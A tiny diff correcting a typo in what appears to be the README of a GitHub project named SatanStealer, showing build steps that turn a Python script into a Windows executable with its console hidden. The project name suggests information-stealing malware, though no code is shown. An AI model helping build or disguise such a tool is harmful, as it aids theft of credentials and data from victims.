@@ -48,4 +48,4 @@ Browse file Select One file and Windows Based (hide the console)
 ![image](https://github.com/HatGirl-zz/SatanStealer/assets/120135553/87a9f016-1e92-4ce0-8808-8f1589ad1add)
 
 
-And press covert .py .exe
+And press convert .py .exe
